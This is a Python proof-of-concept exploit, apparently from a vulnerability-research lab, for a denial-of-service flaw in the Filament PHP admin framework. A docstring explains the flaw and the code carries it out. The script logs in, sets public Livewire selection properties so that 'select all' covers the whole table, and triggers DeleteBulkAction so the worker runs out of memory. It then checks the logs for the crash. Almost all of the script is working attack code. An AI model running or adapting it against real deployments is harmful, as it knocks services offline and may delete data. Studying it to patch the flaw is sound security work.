#!/usr/bin/env python3
"""
VULN-007 — Bulk "select-all" hydrates the entire table into memory (DoS)

Vulnerable code: targets/filament/packages/tables/src/Concerns/HasBulkActions.php
  - :24-31 public $selectedTableRecords/$deselectedTableRecords/$isTrackingDeselectedTableRecords
           — all client-writable, none #[Locked]
  - :303   whereKeyNot($this->deselectedTableRecords)   (whereKeyNot([]) ⇒ no filter ⇒ ALL rows)
  - :308   limit($maxSelectableRecords) applied ONLY if the developer set a cap (default null)
  - :284   $query->get()  (whole table hydrated into models when chunk size is null — the default)
  defaults: Table/Concerns/HasBulkActions.php:28 ($maxSelectableRecords=null),
            actions/src/Concerns/CanFetchSelectedRecords.php:9,11
            (shouldFetchSelectedRecords=true, selectedRecordsChunkSize=null)

Class: CWE-770 Allocation of Resources Without Limits or Throttling (DoS).

The flaw in plain English
-------------------------
Filament models "select all records" as *deselection tracking*: a boolean flag
plus a list of records the user de-selected. All three inputs are public Livewire
properties. With tracking on and an EMPTY deselect list, the selection query
becomes whereKeyNot([]) — Laravel renders that as an always-true predicate, i.e.
the full table — and with the default (null) chunk size and no maxSelectableRecords
cap, the framework hydrates every in-scope row into an Eloquent model in a single
->get() before the bulk action body runs.

Exploitation idea
-----------------
Set the three public selection properties to "select everything", then mount +
execute any fetching bulk action (the shipped DeleteBulkAction fetches by default).
The framework hydrates the whole table to pass $records to the action and OOMs the
512M worker *during hydration* — before the delete loop, so nothing is deleted.

What a successful run proves
---------------------------
mountAction opens instantly; callMountedAction returns HTTP 500 with an
out-of-memory fatal, AND the table row count is unchanged afterwards — proving a
single request made the server try to hydrate the entire table (A:H) and that the
crash preceded any mutation.
"""

import os
import sys
import time
import json
import secrets

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient, LivewireError   # noqa: E402
from lib.common import log, banner, verdict              # noqa: E402
from lib import lab                                      # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
ADMIN_USER = os.environ.get("ADMIN_USER", "ryan@filamentphp.com")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "password")
# Chosen so ->get() hydration alone exceeds 512M (observed 291MB @ 120k) → the OOM
# lands during hydration, BEFORE DeleteBulkAction's delete loop → zero deletes.
TARGET_ROWS = int(os.environ.get("DOS_ROWS", "350000"))
VULN_ID = "VULN-007"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPONENT = "app.filament.resources.post-resource.pages.list-posts"


def oom_in_log() -> str | None:
    try:
        import subprocess
        logs = subprocess.run(
            ["docker", "compose", "-p", "cvehunterlab_filament", "logs", "app", "--since", "40s"],
            capture_output=True, text=True, timeout=30,
            cwd="/opt/cvehunter/targets/filament/_cvehunter_lab",
        ).stdout
        for line in logs.splitlines():
            if "Allowed memory size" in line and "exhausted" in line:
                return line
    except Exception:  # noqa: BLE001
        pass
    return None


def main() -> int:
    banner(VULN_ID, "Bulk select-all hydrates the entire table into memory (DoS)",
           BASE_URL, "HasBulkActions::getSelectedTableRecordsQuery → whereKeyNot([]) + ->get()")

    # --- SETUP: a large backing table -----------------------------------------
    have = lab.post_count()
    log("SETUP", f"posts currently in table: {have}")
    if have < TARGET_ROWS:
        suffix = secrets.token_hex(4)
        log("SETUP", f"bulk-seeding ~{TARGET_ROWS - have} filler posts (generate_series)…")
        have = lab.seed_posts(TARGET_ROWS - have, suffix)
        log("SETUP", f"posts now: {have}")

    # --- SETUP: authenticate as a low-privilege panel user --------------------
    c = LivewireClient(BASE_URL, timeout=120)
    log("SETUP", f"logging in as low-priv user {ADMIN_USER}")
    c.login_admin_panel(ADMIN_USER, ADMIN_PASS)

    before = lab.post_count()
    lp = c.get_component(f"{BASE_URL}/admin/posts", component_name=COMPONENT)

    # --- ATTACK step 1: "select all" via deselection tracking -----------------
    # Empty deselect list + tracking flag ⇒ whereKeyNot([]) ⇒ the whole table.
    # These are public, non-#[Locked] Livewire properties, so we just set them.
    sel_updates = {
        "isTrackingDeselectedTableRecords": True,   # :303 branch
        "deselectedTableRecords": [],               # whereKeyNot([]) ⇒ ALL rows
        "selectedTableRecords": [],
    }
    log("STEP", "mounting the DeleteBulkAction with select-all tracking "
                "(mountAction('delete', table+bulk context))")
    t = time.time()
    lp.call("mountAction", "delete", [], {"table": True, "bulk": True}, updates=sel_updates)
    log("INFO", f"modal mounted in {time.time() - t:.2f}s (count for the confirm message is a cheap COUNT)")

    # --- ATTACK step 2: execute → framework hydrates ALL selected rows --------
    log("STEP", "executing the mounted action (callMountedAction) → the framework "
                "resolves $records by hydrating the ENTIRE table (no cap, no chunk)")
    t = time.time()
    status = None
    try:
        body = lp.call("callMountedAction")
        dt = time.time() - t
        status = 200
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(json.dumps(body)[:3000])
        log("INFO", f"callMountedAction returned HTTP 200 in {dt:.2f}s (survived at this size)")
    except LivewireError as e:
        dt = time.time() - t
        status = 500 if "HTTP 500" in str(e) else -1
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(str(e)[:3000])
        log("PROOF", f"callMountedAction returned HTTP {status} after {dt:.2f}s — worker crashed "
                     f"hydrating the whole selection")

    after = lab.post_count()
    oom = oom_in_log()
    if oom:
        os.makedirs(os.path.join(HERE, "evidence"), exist_ok=True)
        with open(os.path.join(HERE, "evidence", "oom_log.txt"), "w") as f:
            f.write(oom)
        log("PROOF", "app log: " + oom.split("production.ERROR:")[-1].strip()[:150])

    # Non-destructiveness proof: the delete never ran because hydration OOM'd first.
    log("PROOF", f"row count before={before} after={after} "
                 f"({'UNCHANGED — OOM preceded any delete' if after == before else 'CHANGED!'})")

    if status == 500 and after == before:
        log("OK", "exploit confirmed — select-all made the server hydrate the entire table in "
                  "one request and OOM the worker, before performing any operation")
        verdict(VULN_ID, "CONFIRMED",
                "one request with select-all tracking hydrates the whole table → worker OOM "
                "(A:H); no rows deleted (crash preceded the operation)")
        return 0
    if status == 500 and after != before:
        log("FAIL", "worker crashed but rows changed — hydration partly completed; lower risk framing")
        verdict(VULN_ID, "CONFIRMED",
                "select-all hydration crashed the worker (A:H) — note: some rows were affected")
        return 0
    log("FAIL", "no crash at this row count; raise DOS_ROWS and re-run")
    verdict(VULN_ID, "NEEDS_MANUAL", "no crash at this size — increase DOS_ROWS")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
